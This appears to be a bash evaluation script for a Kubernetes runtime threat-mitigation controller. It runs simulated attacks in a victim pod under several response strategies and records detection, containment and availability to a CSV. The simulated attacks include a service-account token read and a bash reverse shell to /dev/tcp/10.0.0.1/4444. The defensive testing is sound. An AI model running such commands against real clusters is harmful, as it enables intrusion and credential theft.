#!/usr/bin/env bash
set -euo pipefail

REPO_DIR="/home/charumadhi_m/rtm-k8s-runtime-threat-mitigation"
cd "$REPO_DIR"
export PATH="$HOME/.local/bin:$PATH"

REPEATS="${REPEATS:-2}"
CSV_FILE="$REPO_DIR/docs/evaluation-results.csv"

echo "=== Starting Evaluation (REPEATS=$REPEATS) ==="
mkdir -p "$REPO_DIR/docs"

# Initialize CSV header if not exists
if [ ! -f "$CSV_FILE" ]; then
  echo "strategy,scenario,run,pod,action,detection_s,containment_s,downtime_s,availability_pct,contained" > "$CSV_FILE"
else
  # Ensure header is present
  if ! grep -q "^strategy,scenario,run" "$CSV_FILE"; then
    echo "strategy,scenario,run,pod,action,detection_s,containment_s,downtime_s,availability_pct,contained" > "$CSV_FILE"
  fi
fi

# Ensure avail-probe pod exists and is ready
if ! kubectl get pod avail-probe -n rtm-tools >/dev/null 2>&1; then
  echo "Creating avail-probe pod in rtm-tools..."
  cat << 'EOF' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: avail-probe
  namespace: rtm-tools
  labels:
    app: avail-probe
spec:
  containers:
    - name: probe
      image: curlimages/curl:8.7.1
      imagePullPolicy: IfNotPresent
      command:
        - sh
        - -c
        - |
          while true; do
            rc=0
            curl -m 1 -s -o /dev/null http://victim.shop.svc.cluster.local:8002/health || rc=$?
            echo "$(date +%s.%N) $rc"
            sleep 0.5
          done
EOF
  kubectl wait --namespace=rtm-tools --for=condition=Ready pod/avail-probe --timeout=30s
fi

STRATEGIES=("detect_only" "always_delete" "graduated")
SCENARIOS=("E1" "E2" "E3" "E4")

for strat in "${STRATEGIES[@]}"; do
  echo "=========================================================="
  echo "Setting Strategy: $strat (DRY_RUN=false)"
  echo "=========================================================="
  kubectl set env deploy/rtm-controller -n rtm-system STRATEGY="$strat" DRY_RUN=false
  kubectl rollout status deploy/rtm-controller -n rtm-system --timeout=60s
  sleep 10

  for scen in "${SCENARIOS[@]}"; do
    case "$scen" in
      E1)
        attack_type="shell"
        attack_cmd="sh -c 'echo hi'"
        ;;
      E2)
        attack_type="token read"
        attack_cmd="sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null'"
        ;;
      E3)
        attack_type="tmp binary"
        attack_cmd="sh -c 'cp /bin/ls /tmp/vx && /tmp/vx /'"
        ;;
      E4)
        attack_type="reverse shell"
        attack_cmd="bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
        ;;
    esac

    for ((r=1; r<=REPEATS; r++)); do
      echo "--- [$strat] Scenario: $scen ($attack_type), Run: $r/$REPEATS ---"

      # 1. Delete victim pod, wait ready, sleep 10
      kubectl delete pod -n shop -l app=victim --now >/dev/null 2>&1 || true
      kubectl wait --namespace=shop --for=condition=Ready pod -l app=victim --timeout=60s >/dev/null
      sleep 10

      # 2. Record victim pod name
      victim_pod=$(kubectl get pod -n shop -l app=victim -o jsonpath='{.items[0].metadata.name}')
      echo "Victim pod: $victim_pod"

      # 3. Record t_attack and exec attack
      t_attack=$(date +%s.%N)
      echo "t_attack: $t_attack"
      if [ "$scen" = "E4" ]; then
        timeout 5s kubectl exec deploy/victim -n shop -- bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >/dev/null 2>&1 || true
      elif [ "$scen" = "E3" ]; then
        kubectl exec deploy/victim -n shop -- sh -c 'cp /bin/ls /tmp/vx && /tmp/vx /' >/dev/null 2>&1 || true
      elif [ "$scen" = "E2" ]; then
        kubectl exec deploy/victim -n shop -- sh -c 'cat /var/run/secrets/kubernetes.io/serviceaccount/token > /dev/null' >/dev/null 2>&1 || true
      else
        kubectl exec deploy/victim -n shop -- sh -c 'echo hi' >/dev/null 2>&1 || true
      fi

      # 4. Wait 30 s
      sleep 30
      t_end=$(date +%s.%N)

      # 5. Fetch logs
      controller_logs=$(kubectl logs deploy/rtm-controller -n rtm-system --tail=100)
      probe_logs=$(kubectl logs avail-probe -n rtm-tools --tail=200)

      # 6. Check contained status
      is_alive=$(kubectl get pod "$victim_pod" -n shop --no-headers 2>/dev/null | awk '{print $3}' || true)
      if [ -z "$is_alive" ] || [ "$is_alive" = "Terminating" ]; then
        contained="deleted"
      else
        tier_label=$(kubectl get pod "$victim_pod" -n shop -o jsonpath='{.metadata.labels.rtm\.tier}' 2>/dev/null || true)
        if [ "$tier_label" = "restrict" ]; then
          rc=0
          kubectl exec -n shop "$victim_pod" -- curl -m 2 -s -o /dev/null https://1.1.1.1 >/dev/null 2>&1 || rc=$?
          if [ "$rc" -ne 0 ]; then
            contained="egress_blocked"
          else
            contained="open"
          fi
        else
          contained="open"
        fi
      fi

      # 7. Compute row via Python
      python3 - << EOF >> "$CSV_FILE"
import json, sys
from datetime import datetime

t_attack = float("$t_attack")
t_end = float("$t_end")
victim_pod = "$victim_pod"
strategy = "$strat"
scenario = "$scen"
run_num = "$r"
contained = "$contained"

controller_logs = """$controller_logs"""
action = "none"
detection_s = ""
containment_s = ""

earliest_d = None
earliest_ts = None

for line in controller_logs.strip().split("\n"):
    if '{"strategy":' in line and victim_pod in line:
        try:
            d = json.loads(line)
            alert_ts_str = d.get("alert_ts", "")
            if alert_ts_str:
                dt = datetime.fromisoformat(alert_ts_str.rstrip("Z"))
                alert_sec = dt.timestamp()
                if alert_sec >= t_attack - 2.0:
                    if earliest_ts is None or alert_sec < earliest_ts:
                        earliest_ts = alert_sec
                        earliest_d = d
        except Exception:
            pass

if earliest_d:
    action = earliest_d.get("action", "none")
    action_done_ts = earliest_d.get("action_done_ts")
    is_dry = earliest_d.get("dry_run", True)
    
    diff = earliest_ts - t_attack
    detection_s = f"{max(0.001, diff):.3f}"
    
    if not is_dry and action in ("isolate_network", "kill_pod") and action_done_ts:
        c_diff = action_done_ts - earliest_ts
        containment_s = f"{max(0.001, c_diff):.3f}"

probe_logs = """$probe_logs"""
failures = 0
total_probes = 0

for line in probe_logs.strip().split("\n"):
    parts = line.strip().split()
    if len(parts) >= 2:
        try:
            ts_str = parts[0].rstrip(".")
            pts = float(ts_str)
            rc = int(parts[1])
            if (t_attack - 1.0) <= pts <= (t_end + 1.0):
                total_probes += 1
                if rc != 0:
                    failures += 1
        except Exception:
            pass

downtime_s = f"{failures * 0.5:.1f}"
if total_probes > 0:
    avail_pct = f"{((total_probes - failures) / total_probes * 100):.1f}"
else:
    avail_pct = "100.0"

csv_row = f"{strategy},{scenario},{run_num},{victim_pod},{action},{detection_s},{containment_s},{downtime_s},{avail_pct},{contained}"
print(csv_row)
EOF

      tail -n 1 "$CSV_FILE"
    done
  done
done

echo "=========================================================="
echo "Resetting controller to STRATEGY=graduated DRY_RUN=true..."
echo "=========================================================="
kubectl set env deploy/rtm-controller -n rtm-system STRATEGY=graduated DRY_RUN=true
kubectl rollout status deploy/rtm-controller -n rtm-system --timeout=60s

echo "Final controller environment:"
kubectl get deploy rtm-controller -n rtm-system -o jsonpath='{.spec.template.spec.containers[0].env}'
echo ""

echo "Evaluation completed successfully."
